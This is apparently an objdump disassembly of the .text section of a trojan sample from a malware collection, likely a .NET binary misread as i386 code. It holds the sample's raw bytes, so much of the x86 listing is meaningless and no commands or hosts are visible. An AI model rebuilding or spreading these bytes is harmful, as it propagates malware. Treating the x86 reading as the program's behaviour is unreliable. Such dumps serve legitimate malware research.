
malware_samples/trojan/49af17975dadf1063915fc892a4c87ba7ef8a0a52018dd32e3493ae74a0a54b8.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	a0 7f 00 00 00       	mov    0x7f,%al
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 90 3d 00       	add    $0x3d9000,%eax
  402013:	00 e0                	add    %ah,%al
  402015:	41                   	inc    %ecx
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	4a                   	dec    %edx
  402051:	00 03                	add    %al,(%ebx)
  402053:	17                   	pop    %ss
  402054:	6f                   	outsl  %ds:(%esi),(%dx)
  402055:	06                   	push   %es
  402056:	00 00                	add    %al,(%eax)
  402058:	0a 00                	or     (%eax),%al
  40205a:	16                   	push   %ss
  40205b:	fe                   	(bad)
  40205c:	13 80 01 00 00 04    	adc    0x4000001(%eax),%eax
  402062:	2a 00                	sub    (%eax),%al
  402064:	1b 30                	sbb    (%eax),%esi
  402066:	04 00                	add    $0x0,%al
  402068:	ca 00 00             	lret   $0x0
  40206b:	00 01                	add    %al,(%ecx)
  40206d:	00 00                	add    %al,(%eax)
  40206f:	11 00                	adc    %eax,(%eax)
  402071:	02 28                	add    (%eax),%ch
  402073:	02 00                	add    (%eax),%al
  402075:	00 06                	add    %al,(%esi)
  402077:	00 7e 11             	add    %bh,0x11(%esi)
  40207a:	00 00                	add    %al,(%eax)
  40207c:	04 2d                	add    $0x2d,%al
  40207e:	13 14 fe             	adc    (%esi,%edi,8),%edx
  402081:	06                   	push   %es
  402082:	10 00                	adc    %al,(%eax)
  402084:	00 06                	add    %al,(%esi)
  402086:	73 07                	jae    0x40208f
  402088:	00 00                	add    %al,(%eax)
  40208a:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  402090:	2b 00                	sub    (%eax),%eax
  402092:	7e 11                	jle    0x4020a5
  402094:	00 00                	add    %al,(%eax)
  402096:	04 28                	add    $0x28,%al
  402098:	08 00                	or     %al,(%eax)
  40209a:	00 0a                	add    %cl,(%edx)
  40209c:	00 72 01             	add    %dh,0x1(%edx)
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	70 28                	jo     0x4020cb
  4020a3:	09 00                	or     %eax,(%eax)
  4020a5:	00 0a                	add    %cl,(%edx)
  4020a7:	00 72 23             	add    %dh,0x23(%edx)
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	70 1a                	jo     0x4020c8
  4020ae:	8d 01                	lea    (%ecx),%eax
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	01 0b                	add    %ecx,(%ebx)
  4020b4:	07                   	pop    %es
  4020b5:	16                   	push   %ss
  4020b6:	7e 03                	jle    0x4020bb
  4020b8:	00 00                	add    %al,(%eax)
  4020ba:	04 a2                	add    $0xa2,%al
  4020bc:	07                   	pop    %es
  4020bd:	17                   	pop    %ss
  4020be:	7e 04                	jle    0x4020c4
  4020c0:	00 00                	add    %al,(%eax)
  4020c2:	04 8c                	add    $0x8c,%al
  4020c4:	14 00                	adc    $0x0,%al
  4020c6:	00 01                	add    %al,(%ecx)
  4020c8:	a2 07 18 7e 05       	mov    %al,0x57e1807
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	04 8c                	add    $0x8c,%al
  4020d1:	14 00                	adc    $0x0,%al
  4020d3:	00 01                	add    %al,(%ecx)
  4020d5:	a2 07 19 7e 06       	mov    %al,0x67e1907
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	04 8c                	add    $0x8c,%al
  4020de:	15 00 00 01 a2       	adc    $0xa2010000,%eax
  4020e3:	07                   	pop    %es
  4020e4:	28 0a                	sub    %cl,(%edx)
  4020e6:	00 00                	add    %al,(%eax)
  4020e8:	0a 00                	or     (%eax),%al
  4020ea:	14 fe                	adc    $0xfe,%al
  4020ec:	06                   	push   %es
  4020ed:	03 00                	add    (%eax),%eax
  4020ef:	00 06                	add    %al,(%esi)
  4020f1:	73 0b                	jae    0x4020fe
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	0a 73 0c             	or     0xc(%ebx),%dh
  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	0a 0a                	or     (%edx),%cl
  4020fc:	06                   	push   %es
  4020fd:	17                   	pop    %ss
  4020fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ff:	0d 00 00 0a 00       	or     $0xa0000,%eax
  402104:	06                   	push   %es
  402105:	72 7b                	jb     0x402182
  402107:	00 00                	add    %al,(%eax)
  402109:	70 6f                	jo     0x40217a
  40210b:	0e                   	push   %cs
  40210c:	00 00                	add    %al,(%eax)
  40210e:	0a 00                	or     (%eax),%al
  402110:	06                   	push   %es
  402111:	6f                   	outsl  %ds:(%esi),(%dx)
  402112:	0f 00 00             	sldt   (%eax)
  402115:	0a 00                	or     (%eax),%al
  402117:	00 28                	add    %ch,(%eax)
  402119:	05 00 00 06 00       	add    $0x60000,%eax
  40211e:	00 de                	add    %bl,%dh
  402120:	17                   	pop    %ss
  402121:	00 16                	add    %dl,(%esi)
  402123:	fe                   	(bad)
  402124:	13 80 01 00 00 04    	adc    0x4000001(%eax),%eax
  40212a:	06                   	push   %es
  40212b:	20 d0                	and    %dl,%al
  40212d:	07                   	pop    %es
  40212e:	00 00                	add    %al,(%eax)
  402130:	6f                   	outsl  %ds:(%esi),(%dx)
  402131:	10 00                	adc    %al,(%eax)
  402133:	00 0a                	add    %cl,(%edx)
  402135:	26 00 dc             	es add %bl,%ah
  402138:	00 2a                	add    %ch,(%edx)
  40213a:	00 00                	add    %al,(%eax)
  40213c:	01 10                	add    %edx,(%eax)
  40213e:	00 00                	add    %al,(%eax)
  402140:	02 00                	add    (%eax),%al
  402142:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402143:	00 0a                	add    %cl,(%edx)
  402145:	b1 00                	mov    $0x0,%cl
  402147:	17                   	pop    %ss
  402148:	00 00                	add    %al,(%eax)
  40214a:	00 00                	add    %al,(%eax)
  40214c:	13 30                	adc    (%eax),%esi
  40214e:	03 00                	add    (%eax),%eax
  402150:	3d 01 00 00 02       	cmp    $0x2000001,%eax
  402155:	00 00                	add    %al,(%eax)
  402157:	11 00                	adc    %eax,(%eax)
  402159:	16                   	push   %ss
  40215a:	0a 38                	or     (%eax),%bh
  40215c:	25 01 00 00 00       	and    $0x1,%eax
  402161:	02 06                	add    (%esi),%al
  402163:	9a 0b 06 17 58 02 8e 	lcall  $0x8e02,$0x5817060b
  40216a:	69 32 03 14 2b 05    	imul   $0x52b1403,(%edx),%esi
  402170:	02 06                	add    (%esi),%al
  402172:	17                   	pop    %ss
  402173:	58                   	pop    %eax
  402174:	9a 00 0c 07 72 8b 00 	lcall  $0x8b,$0x72070c00
  40217b:	00 70 28             	add    %dh,0x28(%eax)
  40217e:	11 00                	adc    %eax,(%eax)
  402180:	00 0a                	add    %cl,(%edx)
  402182:	2c 06                	sub    $0x6,%al
  402184:	08 14 fe             	or     %dl,(%esi,%edi,8)
  402187:	01 2b                	add    %ebp,(%ebx)
  402189:	01 17                	add    %edx,(%edi)
  40218b:	00 13                	add    %dl,(%ebx)
  40218d:	06                   	push   %es
  40218e:	11 06                	adc    %eax,(%esi)
  402190:	2d 11 00 08 80       	sub    $0x80080011,%eax
  402195:	03 00                	add    (%eax),%eax
  402197:	00 04 06             	add    %al,(%esi,%eax,1)
  40219a:	17                   	pop    %ss
  40219b:	58                   	pop    %eax
  40219c:	0a 00                	or     (%eax),%al
  40219e:	38 dd                	cmp    %bl,%ch
  4021a0:	00 00                	add    %al,(%eax)
  4021a2:	00 07                	add    %al,(%edi)
  4021a4:	72 9f                	jb     0x402145
  4021a6:	00 00                	add    %al,(%eax)
  4021a8:	70 28                	jo     0x4021d2
  4021aa:	11 00                	adc    %eax,(%eax)
  4021ac:	00 0a                	add    %cl,(%edx)
  4021ae:	2c 06                	sub    $0x6,%al
  4021b0:	08 14 fe             	or     %dl,(%esi,%edi,8)
  4021b3:	01 2b                	add    %ebp,(%ebx)
  4021b5:	01 17                	add    %edx,(%edi)
  4021b7:	00 13                	add    %dl,(%ebx)
  4021b9:	06                   	push   %es
  4021ba:	11 06                	adc    %eax,(%esi)
  4021bc:	2d 31 00 08 12       	sub    $0x12080031,%eax
  4021c1:	03 28                	add    (%eax),%ebp
  4021c3:	12 00                	adc    (%eax),%al
  4021c5:	00 0a                	add    %cl,(%edx)
  4021c7:	2c 0e                	sub    $0xe,%al
  4021c9:	09 16                	or     %edx,(%esi)
  4021cb:	31 0a                	xor    %ecx,(%edx)
  4021cd:	09 20                	or     %esp,(%eax)
  4021cf:	ff                   	(bad)
  4021d0:	ff 00                	incl   (%eax)
  4021d2:	00 fe                	add    %bh,%dh
  4021d4:	02 2b                	add    (%ebx),%ch
  4021d6:	01 17                	add    %edx,(%edi)
  4021d8:	00 13                	add    %dl,(%ebx)
  4021da:	06                   	push   %es
  4021db:	11 06                	adc    %eax,(%esi)
  4021dd:	2d 06 09 80 04       	sub    $0x4800906,%eax
  4021e2:	00 00                	add    %al,(%eax)
  4021e4:	04 06                	add    $0x6,%al
  4021e6:	17                   	pop    %ss
  4021e7:	58                   	pop    %eax
  4021e8:	0a 00                	or     (%eax),%al
  4021ea:	38 91 00 00 00 07    	cmp    %dl,0x7000000(%ecx)
  4021f0:	72 ad                	jb     0x40219f
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 28                	jo     0x40221e
  4021f6:	11 00                	adc    %eax,(%eax)
  4021f8:	00 0a                	add    %cl,(%edx)
  4021fa:	2c 06                	sub    $0x6,%al
  4021fc:	08 14 fe             	or     %dl,(%esi,%edi,8)
  4021ff:	01 2b                	add    %ebp,(%ebx)
  402201:	01 17                	add    %edx,(%edi)
  402203:	00 13                	add    %dl,(%ebx)
  402205:	06                   	push   %es
  402206:	11 06                	adc    %eax,(%esi)
  402208:	2d 2e 00 08 12       	sub    $0x1208002e,%eax
  40220d:	04 28                	add    $0x28,%al
  40220f:	12 00                	adc    (%eax),%al
  402211:	00 0a                	add    %cl,(%edx)
  402213:	2c 0d                	sub    $0xd,%al
  402215:	11 04 16             	adc    %eax,(%esi,%edx,1)
  402218:	31 08                	xor    %ecx,(%eax)
  40221a:	11 04 1f             	adc    %eax,(%edi,%ebx,1)
  40221d:	3c fe                	cmp    $0xfe,%al
  40221f:	02 2b                	add    (%ebx),%ch
  402221:	01 17                	add    %edx,(%edi)
  402223:	00 13                	add    %dl,(%ebx)
  402225:	06                   	push   %es
  402226:	11 06                	adc    %eax,(%esi)
  402228:	2d 07 11 04 80       	sub    $0x80041107,%eax
  40222d:	05 00 00 04 06       	add    $0x6040000,%eax
  402232:	17                   	pop    %ss
  402233:	58                   	pop    %eax
  402234:	0a 00                	or     (%eax),%al
  402236:	2b 48 07             	sub    0x7(%eax),%ecx
  402239:	72 b9                	jb     0x4021f4
  40223b:	00 00                	add    %al,(%eax)
  40223d:	70 28                	jo     0x402267
  40223f:	11 00                	adc    %eax,(%eax)
  402241:	00 0a                	add    %cl,(%edx)
  402243:	2c 06                	sub    $0x6,%al
  402245:	08 14 fe             	or     %dl,(%esi,%edi,8)
  402248:	01 2b                	add    %ebp,(%ebx)
  40224a:	01 17                	add    %edx,(%edi)
  40224c:	00 13                	add    %dl,(%ebx)
  40224e:	06                   	push   %es
  40224f:	11 06                	adc    %eax,(%esi)
  402251:	2d 2d 00 08 12       	sub    $0x1208002d,%eax
  402256:	05 28 12 00 00       	add    $0x1228,%eax
  40225b:	0a 2c 0d 11 05 17 32 	or     0x32170511(,%ecx,1),%ch
  402262:	08 11                	or     %dl,(%ecx)
  402264:	05 1f 64 fe 02       	add    $0x2fe641f,%eax
  402269:	2b 01                	sub    (%ecx),%eax
  40226b:	17                   	pop    %ss
  40226c:	00 13                	add    %dl,(%ebx)
  40226e:	06                   	push   %es
  40226f:	11 06                	adc    %eax,(%esi)
  402271:	2d 08 11 05 6a       	sub    $0x6a051108,%eax
  402276:	80 06 00             	addb   $0x0,(%esi)
  402279:	00 04 06             	add    %al,(%esi,%eax,1)
  40227c:	17                   	pop    %ss
  40227d:	58                   	pop    %eax
  40227e:	0a 00                	or     (%eax),%al
  402280:	00 06                	add    %al,(%esi)
  402282:	17                   	pop    %ss
  402283:	58                   	pop    %eax
  402284:	0a 06                	or     (%esi),%al
  402286:	02 8e 69 fe 04 13    	add    0x1304fe69(%esi),%cl
  40228c:	06                   	push   %es
  40228d:	11 06                	adc    %eax,(%esi)
  40228f:	3a cc                	cmp    %ah,%cl
  402291:	fe                   	(bad)
  402292:	ff                   	(bad)
  402293:	ff 2a                	ljmp   *(%edx)
  402295:	00 00                	add    %al,(%eax)
  402297:	00 1b                	add    %bl,(%ebx)
  402299:	30 04 00             	xor    %al,(%eax,%eax,1)
  40229c:	bc 03 00 00 03       	mov    $0x3000003,%esp
  4022a1:	00 00                	add    %al,(%eax)
  4022a3:	11 00                	adc    %eax,(%eax)
  4022a5:	7e 03                	jle    0x4022aa
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	04 16                	add    $0x16,%al
  4022ab:	16                   	push   %ss
  4022ac:	20 c1                	and    %al,%cl
  4022ae:	01 00                	add    %eax,(%eax)
  4022b0:	00 28                	add    %ch,(%eax)
  4022b2:	13 00                	adc    (%eax),%eax
  4022b4:	00 06                	add    %al,(%esi)
  4022b6:	80 07 00             	addb   $0x0,(%edi)
  4022b9:	00 04 7e             	add    %al,(%esi,%edi,2)
  4022bc:	07                   	pop    %es
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	04 7e                	add    $0x7e,%al
  4022c1:	13 00                	adc    (%eax),%eax
  4022c3:	00 0a                	add    %cl,(%edx)
  4022c5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4022c8:	00 0a                	add    %cl,(%edx)
  4022ca:	16                   	push   %ss
  4022cb:	fe 01                	incb   (%ecx)
  4022cd:	13 13                	adc    (%ebx),%edx
  4022cf:	11 13                	adc    %edx,(%ebx)
  4022d1:	2d 1b 00 72 cd       	sub    $0xcd72001b,%eax
  4022d6:	00 00                	add    %al,(%eax)
  4022d8:	70 28                	jo     0x402302
  4022da:	15 00 00 0a 8c       	adc    $0x8c0a0000,%eax
  4022df:	14 00                	adc    $0x0,%al
  4022e1:	00 01                	add    %al,(%ecx)
  4022e3:	28 16                	sub    %dl,(%esi)
  4022e5:	00 00                	add    %al,(%eax)
  4022e7:	0a 00                	or     (%eax),%al
  4022e9:	38 71 03             	cmp    %dh,0x3(%ecx)
  4022ec:	00 00                	add    %al,(%eax)
  4022ee:	7e 07                	jle    0x4022f7
  4022f0:	00 00                	add    %al,(%eax)
  4022f2:	04 28                	add    $0x28,%al
  4022f4:	15 00 00 06 13       	adc    $0x13060000,%eax
  4022f9:	13 11                	adc    (%ecx),%edx
  4022fb:	13 2d 30 00 72 ff    	adc    0xff720030,%ebp
  402301:	00 00                	add    %al,(%eax)
  402303:	70 28                	jo     0x40232d
  402305:	15 00 00 0a 8c       	adc    $0x8c0a0000,%eax
  40230a:	14 00                	adc    $0x0,%al
  40230c:	00 01                	add    %al,(%ecx)
  40230e:	28 16                	sub    %dl,(%esi)
  402310:	00 00                	add    %al,(%eax)
  402312:	0a 00                	or     (%eax),%al
  402314:	7e 07                	jle    0x40231d
  402316:	00 00                	add    %al,(%eax)
  402318:	04 28                	add    $0x28,%al
  40231a:	14 00                	adc    $0x0,%al
  40231c:	00 06                	add    %al,(%esi)
  40231e:	26 7e 13             	es jle 0x402334
  402321:	00 00                	add    %al,(%eax)
  402323:	0a 80 07 00 00 04    	or     0x4000007(%eax),%al
  402329:	38 31                	cmp    %dh,(%ecx)
  40232b:	03 00                	add    (%eax),%eax
  40232d:	00 7e 17             	add    %bh,0x17(%esi)
  402330:	00 00                	add    %al,(%eax)
  402332:	0a 0a                	or     (%edx),%cl
  402334:	14 0b                	adc    $0xb,%al
  402336:	16                   	push   %ss
  402337:	6a 0c                	push   $0xc
  402339:	28 18                	sub    %bl,(%eax)
  40233b:	00 00                	add    %al,(%eax)
  40233d:	0a 0d 00 38 c2 02    	or     0x2c23800,%cl
  402343:	00 00                	add    %al,(%eax)
  402345:	00 00                	add    %al,(%eax)
  402347:	28 18                	sub    %bl,(%eax)
  402349:	00 00                	add    %al,(%eax)
  40234b:	0a 06                	or     (%esi),%al
  40234d:	28 19                	sub    %bl,(%ecx)
  40234f:	00 00                	add    %al,(%eax)
  402351:	0a 13                	or     (%ebx),%dl
  402353:	14 12                	adc    $0x12,%al
  402355:	14 28                	adc    $0x28,%al
  402357:	1a 00                	sbb    (%eax),%al
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	23 00                	and    (%eax),%eax
  40235d:	00 00                	add    %al,(%eax)
  40235f:	00 00                	add    %al,(%eax)
  402361:	00 14 40             	add    %dl,(%eax,%eax,2)
  402364:	2f                   	das
  402365:	1d 7e 08 00 00       	sbb    $0x87e,%eax
  40236a:	04 7e                	add    $0x7e,%al
  40236c:	13 00                	adc    (%eax),%eax
  40236e:	00 0a                	add    %cl,(%edx)
  402370:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402373:	00 0a                	add    %cl,(%edx)
  402375:	2d 0c 7e 08 00       	sub    $0x87e0c,%eax
  40237a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40237d:	18 00                	sbb    %al,(%eax)
  40237f:	00 06                	add    %al,(%esi)
  402381:	2b 01                	sub    (%ecx),%eax
  402383:	16                   	push   %ss
  402384:	00 13                	add    %dl,(%ebx)
  402386:	13 11                	adc    (%ecx),%edx
  402388:	13 2d 0e 00 28 04    	adc    0x428000e,%ebp
  40238e:	00 00                	add    %al,(%eax)
  402390:	06                   	push   %es
  402391:	00 28                	add    %ch,(%eax)
  402393:	18 00                	sbb    %al,(%eax)
  402395:	00 0a                	add    %cl,(%edx)
  402397:	0a 00                	or     (%eax),%al
  402399:	16                   	push   %ss
  40239a:	13 11                	adc    (%ecx),%edx
  40239c:	7e 02                	jle    0x4023a0
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	04 25                	add    $0x25,%al
  4023a2:	13 15 12 11 28 1b    	adc    0x1b281112,%edx
  4023a8:	00 00                	add    %al,(%eax)
  4023aa:	0a 00                	or     (%eax),%al
  4023ac:	00 7e 08             	add    %bh,0x8(%esi)
  4023af:	00 00                	add    %al,(%eax)
  4023b1:	04 13                	add    $0x13,%al
  4023b3:	04 7e                	add    $0x7e,%al
  4023b5:	09 00                	or     %eax,(%eax)
  4023b7:	00 04 13             	add    %al,(%ebx,%edx,1)
  4023ba:	05 00 de 14 11       	add    $0x1114de00,%eax
  4023bf:	11 16                	adc    %edx,(%esi)
  4023c1:	fe 01                	incb   (%ecx)
  4023c3:	13 13                	adc    (%ebx),%edx
  4023c5:	11 13                	adc    %edx,(%ebx)
  4023c7:	2d 08 11 15 28       	sub    $0x28151108,%eax
  4023cc:	1c 00                	sbb    $0x0,%al
  4023ce:	00 0a                	add    %cl,(%edx)
  4023d0:	00 dc                	add    %bl,%ah
  4023d2:	00 11                	add    %dl,(%ecx)
  4023d4:	04 7e                	add    $0x7e,%al
  4023d6:	13 00                	adc    (%eax),%eax
  4023d8:	00 0a                	add    %cl,(%edx)
  4023da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4023dd:	00 0a                	add    %cl,(%edx)
  4023df:	16                   	push   %ss
  4023e0:	fe 01                	incb   (%ecx)
  4023e2:	13 13                	adc    (%ebx),%edx
  4023e4:	11 13                	adc    %edx,(%ebx)
  4023e6:	2d 11 00 20 fa       	sub    $0xfa200011,%eax
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	00 28                	add    %ch,(%eax)
  4023ef:	1d 00 00 0a 00       	sbb    $0xa0000,%eax
  4023f4:	dd 0e                	fisttpll (%esi)
  4023f6:	02 00                	add    (%eax),%al
  4023f8:	00 12                	add    %dl,(%edx)
  4023fa:	05 7b 2d 00 00       	add    $0x2d7b,%eax
  4023ff:	04 12                	add    $0x12,%al
  402401:	05 7b 2b 00 00       	add    $0x2b7b,%eax
  402406:	04 59                	add    $0x59,%al
  402408:	13 06                	adc    (%esi),%eax
  40240a:	12 05 7b 2e 00 00    	adc    0x2e7b,%al
  402410:	04 12                	add    $0x12,%al
  402412:	05 7b 2c 00 00       	add    $0x2c7b,%eax
  402417:	04 59                	add    $0x59,%al
  402419:	13 07                	adc    (%edi),%eax
  40241b:	11 06                	adc    %eax,(%esi)
  40241d:	16                   	push   %ss
  40241e:	31 07                	xor    %eax,(%edi)
  402420:	11 07                	adc    %eax,(%edi)
  402422:	16                   	push   %ss
  402423:	fe 02                	incb   (%edx)
  402425:	2b 01                	sub    (%ecx),%eax
  402427:	16                   	push   %ss
  402428:	00 13                	add    %dl,(%ebx)
  40242a:	13 11                	adc    (%ecx),%edx
  40242c:	13 2d 0e 00 1f 64    	adc    0x641f000e,%ebp
  402432:	28 1d 00 00 0a 00    	sub    %bl,0xa0000
  402438:	dd ca                	(bad)
  40243a:	01 00                	add    %eax,(%eax)
  40243c:	00 07                	add    %al,(%edi)
  40243e:	2c 16                	sub    $0x16,%al
  402440:	07                   	pop    %es
  402441:	6f                   	outsl  %ds:(%esi),(%dx)
  402442:	1e                   	push   %ds
  402443:	00 00                	add    %al,(%eax)
  402445:	0a 11                	or     (%ecx),%dl
  402447:	06                   	push   %es
  402448:	33 0c 07             	xor    (%edi,%eax,1),%ecx
  40244b:	6f                   	outsl  %ds:(%esi),(%dx)
  40244c:	1f                   	pop    %ds
  40244d:	00 00                	add    %al,(%eax)
  40244f:	0a 11                	or     (%ecx),%dl
  402451:	07                   	pop    %es
  402452:	fe 01                	incb   (%ecx)
  402454:	2b 01                	sub    (%ecx),%eax
  402456:	16                   	push   %ss
  402457:	00 13                	add    %dl,(%ebx)
  402459:	13 11                	adc    (%ecx),%edx
  40245b:	13 2d 5c 00 07 14    	adc    0x1407005c,%ebp
  402461:	fe 01                	incb   (%ecx)
  402463:	13 13                	adc    (%ebx),%edx
  402465:	11 13                	adc    %edx,(%ebx)
  402467:	2d 07 07 6f 20       	sub    $0x206f0707,%eax
  40246c:	00 00                	add    %al,(%eax)
  40246e:	0a 00                	or     (%eax),%al
  402470:	11 06                	adc    %eax,(%esi)
  402472:	11 07                	adc    %eax,(%edi)
  402474:	20 08                	and    %cl,(%eax)
  402476:	18 02                	sbb    %al,(%edx)
  402478:	00 73 21             	add    %dh,0x21(%ebx)
  40247b:	00 00                	add    %al,(%eax)
  40247d:	0a 0b                	or     (%ebx),%cl
  40247f:	16                   	push   %ss
  402480:	13 08                	adc    (%eax),%ecx
  402482:	7e 02                	jle    0x402486
  402484:	00 00                	add    %al,(%eax)
  402486:	04 25                	add    $0x25,%al
  402488:	13 15 12 08 28 1b    	adc    0x1b280812,%edx
  40248e:	00 00                	add    %al,(%eax)
  402490:	0a 00                	or     (%eax),%al
  402492:	00 11                	add    %dl,(%ecx)
  402494:	06                   	push   %es
  402495:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  402499:	04 11                	add    $0x11,%al
  40249b:	07                   	pop    %es
  40249c:	80 0d 00 00 04 00 de 	orb    $0xde,0x40000
  4024a3:	14 11                	adc    $0x11,%al
  4024a5:	08 16                	or     %dl,(%esi)
  4024a7:	fe 01                	incb   (%ecx)
  4024a9:	13 13                	adc    (%ebx),%edx
  4024ab:	11 13                	adc    %edx,(%ebx)
  4024ad:	2d 08 11 15 28       	sub    $0x28151108,%eax
  4024b2:	1c 00                	sbb    $0x0,%al
  4024b4:	00 0a                	add    %cl,(%edx)
  4024b6:	00 dc                	add    %bl,%ah
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	07                   	pop    %es
  4024bb:	28 22                	sub    %ah,(%edx)
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	0a 13                	or     (%ebx),%dl
  4024c1:	0a 00                	or     (%eax),%al
  4024c3:	11 0a                	adc    %ecx,(%edx)
  4024c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c6:	23 00                	and    (%eax),%eax
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	13 0b                	adc    (%ebx),%ecx
  4024cc:	00 11                	add    %dl,(%ecx)
  4024ce:	04 11                	add    $0x11,%al
  4024d0:	0b 18                	or     (%eax),%ebx
  4024d2:	28 1b                	sub    %bl,(%ebx)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	06                   	push   %es
  4024d7:	13 09                	adc    (%ecx),%ecx
  4024d9:	00 de                	add    %bl,%dh
  4024db:	0d 00 11 0a 11       	or     $0x110a1100,%eax
  4024e0:	0b 6f 24             	or     0x24(%edi),%ebp
  4024e3:	00 00                	add    %al,(%eax)
  4024e5:	0a 00                	or     (%eax),%al
  4024e7:	00 dc                	add    %bl,%ah
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	de 14 11             	ficoms (%ecx,%edx,1)
  4024ee:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4024f1:	01 13                	add    %edx,(%ebx)
  4024f3:	13 11                	adc    (%ecx),%edx
  4024f5:	13 2d 08 11 0a 6f    	adc    0x6f0a1108,%ebp
  4024fb:	25 00 00 0a 00       	and    $0xa0000,%eax
  402500:	dc 00                	faddl  (%eax)
  402502:	11 09                	adc    %ecx,(%ecx)
  402504:	16                   	push   %ss
  402505:	fe 01                	incb   (%ecx)
  402507:	13 13                	adc    (%ebx),%edx
  402509:	11 13                	adc    %edx,(%ebx)
  40250b:	2d 42 00 07 7e       	sub    $0x7e070042,%eax
  402510:	06                   	push   %es
  402511:	00 00                	add    %al,(%eax)
  402513:	04 28                	add    $0x28,%al
  402515:	0b 00                	or     (%eax),%eax
  402517:	00 06                	add    %al,(%esi)
  402519:	13 0c 16             	adc    (%esi,%edx,1),%ecx
  40251c:	13 0d 7e 02 00 00    	adc    0x27e,%ecx
  402522:	04 25                	add    $0x25,%al
  402524:	13 15 12 0d 28 1b    	adc    0x1b280d12,%edx
  40252a:	00 00                	add    %al,(%eax)
  40252c:	0a 00                	or     (%eax),%al
  40252e:	00 11                	add    %dl,(%ecx)
  402530:	0c 80                	or     $0x80,%al
  402532:	0b 00                	or     (%eax),%eax
  402534:	00 04 00             	add    %al,(%eax,%eax,1)
  402537:	de 14 11             	ficoms (%ecx,%edx,1)
  40253a:	0d 16 fe 01 13       	or     $0x1301fe16,%eax
  40253f:	13 11                	adc    (%ecx),%edx
  402541:	13 2d 08 11 15 28    	adc    0x28151108,%ebp
  402547:	1c 00                	sbb    $0x0,%al
  402549:	00 0a                	add    %cl,(%edx)
  40254b:	00 dc                	add    %bl,%ah
  40254d:	00 00                	add    %al,(%eax)
  40254f:	08 17                	or     %dl,(%edi)
  402551:	6a 58                	push   $0x58
  402553:	0c 28                	or     $0x28,%al
  402555:	18 00                	sbb    %al,(%eax)
  402557:	00 0a                	add    %cl,(%edx)
  402559:	09 28                	or     %ebp,(%eax)
  40255b:	19 00                	sbb    %eax,(%eax)
  40255d:	00 0a                	add    %cl,(%edx)
  40255f:	13 0e                	adc    (%esi),%ecx
  402561:	12 0e                	adc    (%esi),%cl
  402563:	28 1a                	sub    %bl,(%edx)
  402565:	00 00                	add    %al,(%eax)
  402567:	0a 23                	or     (%ebx),%ah
  402569:	00 00                	add    %al,(%eax)
  40256b:	00 00                	add    %al,(%eax)
  40256d:	00 00                	add    %al,(%eax)
  40256f:	f0 3f                	lock aas
  402571:	fe 05 13 13 11 13    	incb   0x13111313
  402577:	2d 46 00 16 13       	sub    $0x13160046,%eax
  40257c:	0f 7e 02             	movd   %mm0,(%edx)
  40257f:	00 00                	add    %al,(%eax)
  402581:	04 25                	add    $0x25,%al
  402583:	13 15 12 0f 28 1b    	adc    0x1b280f12,%edx
  402589:	00 00                	add    %al,(%eax)
  40258b:	0a 00                	or     (%eax),%al
  40258d:	00 08                	add    %cl,(%eax)
  40258f:	6c                   	insb   (%dx),%es:(%edi)
  402590:	12 0e                	adc    (%esi),%cl
  402592:	28 1a                	sub    %bl,(%edx)
  402594:	00 00                	add    %al,(%eax)
  402596:	0a 5b 80             	or     -0x80(%ebx),%bl
  402599:	0e                   	push   %cs
  40259a:	00 00                	add    %al,(%eax)
  40259c:	04 00                	add    $0x0,%al
  40259e:	de 14 11             	ficoms (%ecx,%edx,1)
  4025a1:	0f 16 fe             	movlhps %xmm6,%xmm7
  4025a4:	01 13                	add    %edx,(%ebx)
  4025a6:	13 11                	adc    (%ecx),%edx
  4025a8:	13 2d 08 11 15 28    	adc    0x28151108,%ebp
  4025ae:	1c 00                	sbb    $0x0,%al
  4025b0:	00 0a                	add    %cl,(%edx)
  4025b2:	00 dc                	add    %bl,%ah
  4025b4:	00 16                	add    %dl,(%esi)
  4025b6:	6a 0c                	push   $0xc
  4025b8:	28 18                	sub    %bl,(%eax)
  4025ba:	00 00                	add    %al,(%eax)
  4025bc:	0a 0d 00 20 e8 03    	or     0x3e82000,%cl
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	17                   	pop    %ss
  4025c5:	7e 05                	jle    0x4025cc
  4025c7:	00 00                	add    %al,(%eax)
  4025c9:	04 28                	add    $0x28,%al
  4025cb:	26 00 00             	add    %al,%es:(%eax)
  4025ce:	0a 5b 13             	or     0x13(%ebx),%bl
  4025d1:	10 11                	adc    %dl,(%ecx)
  4025d3:	10 28                	adc    %ch,(%eax)
  4025d5:	1d 00 00 0a 00       	sbb    $0xa0000,%eax
  4025da:	00 de                	add    %bl,%dh
  4025dc:	28 13                	sub    %dl,(%ebx)
